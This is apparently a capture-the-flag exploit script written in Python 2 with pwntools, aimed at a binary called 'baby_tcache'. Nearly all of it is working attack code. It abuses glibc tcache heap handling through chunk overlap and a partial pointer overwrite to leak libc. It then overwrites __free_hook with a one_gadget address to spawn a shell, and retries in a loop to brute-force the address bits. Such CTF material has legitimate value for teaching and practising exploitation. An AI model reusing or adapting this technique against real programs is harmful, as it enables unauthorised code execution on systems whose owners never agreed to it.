#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './baby_tcache'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(": ", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(size, data):
    sla(":", size)
    sa(":", data)

@choice(idx=2)
def delete(idx):
    sla(":", idx)

one_gadget = get_one_gadget(libc.path)
def exp(host, rce=False):
    if rce:
        pass    
    new(0x4f0, "a") #0
    new(0x20, "a") #1
    new(0x20, "a") #2
    new(0x4f0, "a") #3
    new(0x20, "a") #4
    delete(2)
    new(0x28, "a"*0x20 + p64(0x560)) #2
    delete(0)
    delete(3)
    delete(1)
    new(0x4f0, "a") #0
    new(0x100, p16(0x4760)) #1
    new(0x20, "a") #3
    #ga("breakrva 0xD2C\nc")
    new(0x20, p64(0x800)+"\x00"*9)
    r(8)
    libc.address = uu64(r(6))
    if hex(libc.address)[2:4] != '7f':
        raise Exception 
    libc.address -=   0x3ed8b0
    lg("libc", libc.address)
    delete(3)
    #ga()
    delete(1)
    new(0x100, p64(libc.sym['__free_hook']))
    new(0x100, p64(0))
    new(0x100, p64(libc.address + one_gadget[1]))
    sl("2")
    sl("1")
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    while True:
        try:
            exp(host,True)
            break
        except Exception as e:
            print(e)
            io.close()
            io = process(exe)

